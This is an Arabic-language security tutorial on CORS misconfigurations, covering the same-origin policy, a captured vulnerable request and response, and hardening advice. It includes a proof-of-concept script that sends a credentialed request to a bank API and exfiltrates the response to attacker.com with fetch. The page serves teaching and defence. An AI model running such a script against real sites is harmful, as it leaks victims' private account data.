🌐 CORS Misconfigurations — عيوب مشاركة الموارد

شرح آلية استغلال عيوب إعدادات مشاركة الموارد عابرة المواقع (CORS) لتسريب بيانات المستخدمين وقراءة الاستجابات الحساسة

🛠️ Burp Suite · CORS PoC Generator · Fetch API 📋 OWASP: Broken Access Control | Web Security CVSS Impact: Medium → High (Data Leak)

📚 النظرية — سياسة منشأ الطلب المشترك (SOP) ودور الـ CORS

تمنع سياسة **Same-Origin Policy (SOP)** في المتصفحات أي موقع ويب خارجي من قراءة بيانات موقع آخر (مثل قراءة كود الـ HTML لاستجابة حساب البنك).
الـ **CORS (Cross-Origin Resource Sharing)** هي آلية مبنية في المتصفحات تسمح للخادم بالإعلان عن المواقع الخارجية المسموح لها بتخطي قيود الـ SOP وقراءة بياناته.

🚨 ثغرة CORS Misconfiguration

تحدث الثغرة عندما يقوم السيرفر بتثبيت إعدادات تفويض متساهلة جداً، أو عندما يقوم بالرد بتمرير عنوان الـ Origin الممرر له مباشرة في الاستجابة (Origin Reflection) مع تفعيل خيار المصادقة (Credentials).

⚠️ خطر الـ Access-Control-Allow-Credentials

إذا أرجع السيرفر ترويسات:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
يسمح المتصفح للموقع الخبيث بإرسال طلب بالنيابة عن الضحية حاملاً الـ Session Cookies الخاصة به، ويسمح للموقع الخبيث بقراءة استجابة الـ API الحساسة بالكامل!

🔬 تشريح خطوات الهجوم والـ PoC Exploitation

1. Vulnerable Response Header Analysis (Burp capture):
# Attacker Request: GET /api/v1/user_data HTTP/1.1 Host: bank.com Origin: https://attacker.com Cookie: SessionID=victim_active_session_cookie_123 # Vulnerable Response returned by server: HTTP/1.1 200 OK Access-Control-Allow-Origin: https://attacker.com Access-Control-Allow-Credentials: true Content-Type: application/json {"balance": "$1,000,000", "private_email": "victim@bank.com"}
2. Exploitation Proof-of-Concept (HTML Page hosted by attacker): 
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  // Send authenticated request to target API
  req.open('get', 'https://bank.com/api/v1/user_data', true);
  req.withCredentials = true;
  req.send();
  
  function reqListener() {
      // Exfiltrate response data to attacker's server
      fetch('https://attacker.com/log?loot=' + encodeURIComponent(this.responseText));
  };
</script>

🛡️ الحماية والدفاع — تأمين إعدادات CORS

✅ تأمين ترويسات الاستجابة

  • Never Reflect Origin: تجنب برمجة السيرفر لقراءة ترويسة الـ Origin وإرجاعها تلقائياً في الاستجابة.
  • Strict Whitelist: تحديد النطاقات الموثوقة والمصرح لها بقراءة البيانات بدقة شديدة وقصر الـ Origin عليها بشكل ثابت.

🔒 تجنب دمج الإعدادات الخطرة

  • Credentials and Wildcard: يمنع بروتوكول المتصفح استخدام الرمز النجمي * مع Access-Control-Allow-Credentials: true. احرص على عدم محاكاة هذا الدمج يدوياً برمجياً لتجنب الاختراق.
  • Do not trust null origin: تجنب الثقة بـ null كمنشأ مقبول (Access-Control-Allow-Origin: null).
